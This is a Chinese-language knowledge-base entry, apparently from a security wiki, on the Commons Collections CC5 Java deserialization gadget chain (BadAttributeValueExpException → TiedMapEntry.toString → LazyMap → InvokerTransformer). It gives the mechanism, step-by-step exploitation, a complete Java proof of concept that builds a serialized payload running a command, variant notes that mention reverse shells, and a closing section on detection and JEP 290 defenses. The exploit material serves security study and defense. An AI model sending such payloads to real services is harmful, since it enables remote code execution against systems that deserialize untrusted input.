---
id: web-java-deser-commonscollections-cc5-badattribute-tostring
title: CC5 BadAttributeValueExpException + TiedMapEntry.toString 触发 LazyMap
type: scenario
domain: web
path: web/java/deserialization
technique: cc5-badattribute-tiedmapentry-tostring
tags:
- java
- deserialization
- gadget
- commons-collections
- cc5
- badattributevalue
- tiedmapentry
- lazymap
cve: []
severity: high
confidence: high
status: verified
affected_versions: Commons Collections <= 3.2.1（原文）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:08:53+08:00'
  notes: 已对照原文核对：BadAttributeValueExpException.readObject 在无 SecurityManager 时对 val 调 toString、构造函数会提前 toString 故用 null 构造后反射改 val、TiedMapEntry.toString→LazyMap.get→ChainedTransformer 与原文 CC5 完全一致；affected_versions 按原文 CC<=3.2.1 标注
url: /docs/web/java/deserialization/web-java-deser-commonscollections-cc5-badattribute-tostring/
draft: false
kb_aliases:
- CC5
- BadAttributeValueExpException 链
- TiedMapEntry toString
- Commons Collections 5
- LazyMap toString 触发
---

## 一句话结论

在 Commons Collections <= 3.2.1 中，把 `TiedMapEntry` 反射塞进 `BadAttributeValueExpException.val`，反序列化时 `readObject` 调用 `val.toString()`，`TiedMapEntry.toString()` 触发 `LazyMap.get()`，进而执行 `ChainedTransformer`/`InvokerTransformer` 的命令执行链。

## 原理

- `BadAttributeValueExpException.readObject()` 读取 `val` 字段：当 `val` 非 null 且不是 String、且满足“无 SecurityManager 或 val 是基本类型包装类”时，执行 `val = valObj.toString()`；否则走 identityHashCode 分支。默认无 SecurityManager 时，任意可序列化对象的 `toString()` 都会被调用。
- `BadAttributeValueExpException(Object val)` 构造函数本身会执行 `val == null ? null : val.toString()`，所以不能直接把恶意对象传给构造函数（会在生成端提前触发）；应使用 `new BadAttributeValueExpException(null)`，再反射把 `val` 字段设为 `TiedMapEntry`。
- `TiedMapEntry.toString()` 返回 `getKey() + "=" + getValue()`；`getValue()` 调用 `map.get(key)`。把 `map` 设为 `LazyMap`，`get(key)` 在 key 不存在时调用 `factory.transform(key)`，即进入 `ChainedTransformer`。
- Transformer 链与 CC6 相同：`ConstantTransformer(Runtime.class)` → `InvokerTransformer("getMethod", ...)` → `InvokerTransformer("invoke", ...)` → `InvokerTransformer("exec", ...)`。
- 与 CC6 的区别只在触发器：CC6 用 `HashMap.readObject → TiedMapEntry.hashCode`，CC5 用 `BadAttributeValueExpException.readObject → TiedMapEntry.toString`；两者最终都落到 `LazyMap.get`。

## 触发条件

- Commons Collections <= 3.2.1（`InvokerTransformer` 可序列化）。
- 目标 JDK 提供 `javax.management.BadAttributeValueExpException`（JDK 自带），且反序列化时未启用 SecurityManager（否则可能走 identityHashCode 分支）。
- 目标存在 Java 原生反序列化入口，未过滤 `BadAttributeValueExpException`、`TiedMapEntry`、`LazyMap`、`ChainedTransformer` 等类。
- `Runtime.exec` 未被策略阻断。

## 利用步骤

1. 构造 `LazyMap.decorate(new HashMap(), chainedTransformer)`，`chainedTransformer` 为 Runtime.exec 链。
2. 构造 `new TiedMapEntry(lazyMap, null)`。
3. `new BadAttributeValueExpException(null)`，反射把 `val` 字段设为该 `TiedMapEntry`。
4. 序列化 `BadAttributeValueExpException` 并发送到目标。
5. 目标 `readObject` 调用 `val.toString()` → `TiedMapEntry.toString()` → `LazyMap.get()` → 命令执行。

## PoC

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception {
        Transformer[] ts = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, null}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"})
        };
        ChainedTransformer chain = new ChainedTransformer(ts);

        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, null);

        BadAttributeValueExpException payload = new BadAttributeValueExpException(null);
        Field f = BadAttributeValueExpException.class.getDeclaredField("val");
        f.setAccessible(true);
        f.set(payload, entry);   // 不能走构造函数，否则生成端提前 toString

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(payload);
        }
    }
}
```

## 变体与关联

- 变体：`BadAttributeValueExpException` 的 `val` 也可放其它 `toString()` 会进入危险路径的对象（如 `TiedMapEntry`、`POJONode` 等）。
- 变体：Linux 上可用 `exec` 参数数组、`ProcessBuilder`、写文件或反弹 shell；Windows 上注意命令分词。
- 关联：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（CC6 用 hashCode 触发同一 LazyMap）；[[web-java-deser-commonscollections-cc1-transformedmap]]（另一条 TransformedMap 入口）；[[web-java-deser-commonscollections-cc7-hashtable-equals-lazymap]]（Hashtable.equals 入口）。
- 边界：SecurityManager 存在且 `val` 不是基本类型包装类时，`readObject` 可能不调用 `toString`；CC 3.2.2 禁用 `InvokerTransformer` 后失效；JEP 290 过滤相关类时失效。

## 检测与防御

- 检测：序列化流中出现 `BadAttributeValueExpException` + `TiedMapEntry` + `LazyMap` + `ChainedTransformer` 组合；反序列化后出现 `Runtime.exec`/子进程。
- 修复：升级 Commons Collections 到 3.2.2+ 并关闭 unsafe serialization；消除不可信 Java 原生反序列化。
- 加固：JEP 290 `ObjectInputFilter` 白名单，拒绝 `javax.management.BadAttributeValueExpException` 等非业务类；限制 `Runtime.exec`。
